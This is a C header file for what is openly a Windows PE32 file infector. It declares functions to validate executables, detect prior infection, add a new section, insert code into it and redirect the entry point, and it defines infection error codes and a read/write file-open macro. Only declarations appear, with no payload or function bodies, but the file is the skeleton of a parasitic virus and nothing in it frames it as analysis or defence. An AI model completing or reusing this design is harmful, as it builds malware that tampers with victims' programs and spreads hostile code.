#ifndef P32_INFECT_H
#define P32_INFECT_H

#define P32_NO_ERROR             0x00000000
#define P32_READFILE_ERROR       0x10000000
#define P32_WRITEFILE_ERROR      0x01000000
#define P32_INTOVERFLOW_ERROR    0x00100000
#define P32_ISX64_FILE_ERROR     0x00010000
#define P32_INVALIDPE_ERROR      0x00001000
#define P32_BADFILESIZE_ERROR    0x00000100
#define P32_GETHEAP_ERROR        0x00000010
#define P32_HEAPALLOC_ERROR      0x00000001
#define P32_ALREADY_INFECT_ERROR 0xf0000000

#define p32_openFile(fName) \
        CreateFile((LPCSTR)fName,\
				   (DWORD)(GENERIC_READ | GENERIC_WRITE), \
				   (DWORD)FILE_SHARE_READ,                \
				   (LPSECURITY_ATTRIBUTES)NULL,           \
				   (DWORD)OPEN_EXISTING,                  \
				   (DWORD)(FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM), \
				   (HANDLE)NULL \
				  )

#define p32_closeFile(hFile) \
        CloseHandle((HANDLE)hFile)
        
#define P32_ALIGN(sSize,fmAlign,fmAddr) \
        fmAddr + (sSize / fmAlign + 1) * fmAlign

typedef struct {
	
	    HANDLE                hFile;
	    /*DWORD                 errorCode;*/
	    DWORD                 ep;
	    DWORD                 oEp;
	    PIMAGE_SECTION_HEADER nSection;
	
}P32_HNDS,*PP32_HNDS;

DWORD                 p32_isValidPe32(PIMAGE_DOS_HEADER,PIMAGE_NT_HEADERS32);
DWORD                 p32_alignment(DWORD,DWORD,DWORD);
PIMAGE_SECTION_HEADER p32_isAlreadyInfected(CONST CHAR* CONST,PIMAGE_SECTION_HEADER,CONST UWORD);
DWORD                 p32_addNewSection(PP32_HNDS,CONST CHAR* CONST,DWORD,UINT);
BOOL                  p32_insertCode(HANDLE,PIMAGE_SECTION_HEADER,const CHAR*,UINT);
VOID                  p32_setEntryPoint(HANDLE,DWORD,DWORD);


#endif
